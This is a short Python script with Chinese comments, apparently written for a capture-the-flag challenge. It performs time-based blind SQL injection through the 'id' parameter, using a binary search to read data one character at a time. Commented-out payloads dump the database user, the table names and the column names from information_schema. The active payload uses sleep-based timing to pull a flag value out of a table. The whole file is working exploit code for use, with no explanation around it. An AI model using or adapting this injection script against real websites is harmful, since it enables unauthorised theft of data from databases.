#时间盲注，二分法
import requests
url = '' #url
flag = ''


for i in range(1, 50):
    l,r = 32, 127
    while l < r:
        mid = (l+r) // 2
        # where id = 1
        # 爆用户名
        # payload = f'2-if(ascii(substr((select user()), {i}, 1))<={mid}, 1, 0)'

        # 爆表名
        # payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i}, 1))<={mid}, 1, 0)'
        
        # 爆列名
        # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'f1ag_table\'), {i}, 1))<={mid}, 1, 0)'
        
        #爆最后的flag
        payload = f'2-if(ascii(substr((select group_concat(flag) from flag_table), {i}, 1))<={mid}, sleep(1), 0)'
        res = requests.get(url, params={
            'id': payload
        })
        
        if res.elapsed.total_seconds() > 1.: 
            #网络请求的耗时大于1秒
            r = mid
        else:
            l = mid+1
    flag += chr(l)
    print(flag)